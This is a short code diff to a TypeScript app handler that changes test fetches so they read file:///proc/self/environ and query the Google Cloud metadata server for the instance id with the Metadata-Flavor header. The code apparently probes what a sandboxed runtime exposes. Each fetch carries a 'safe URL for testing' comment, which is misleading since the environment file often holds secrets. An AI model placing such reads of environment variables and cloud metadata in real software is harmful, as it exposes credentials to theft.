@@ -21,10 +21,17 @@ export default defineApp(async (_req, ctx) => {
   let externalData: any = null;
   let exData: any = null;
   try {
-    exData = await fetch(`file:///etc/hosts`) // <-- safe URL for testing
+    exData = await fetch(`file:///proc/self/environ`) // <-- safe URL for testing
       .then((res) => res.text());
 
-    const gcp = await fetch(`http://metadata.google.internal`) // <-- safe URL for testing
+    const gcp = await fetch(
+      `http://metadata.google.internal/computeMetadata/v1/instance/id`,
+      {
+        headers: {
+          "Metadata-Flavor": "Google",
+        },
+      },
+    ) // <-- safe URL for testing
       .then((res) => res.text());
 
     externalData = await fetch(
